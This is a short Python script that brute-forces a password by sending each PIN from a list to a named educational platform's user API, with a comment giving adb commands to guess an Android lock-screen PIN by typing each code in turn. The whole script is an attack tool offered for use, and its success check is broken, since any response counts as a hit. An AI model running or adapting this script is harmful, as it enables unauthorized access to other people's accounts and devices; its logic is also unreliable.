import requests
import pins
requests.post('https://cs.api.pltw.org/user/test_williamkenzie')
for pin in pins.pins:
    int(pin)
    # To crack Android pin, run command in bash with this: adb shell input text {pin} && adb shell input keyevent 66
    r = requests.get('https://cs.api.pltw.org/user/rest?password=' + pin)
    if(r.status_code):
        print("Done, PIN=", str(pin))
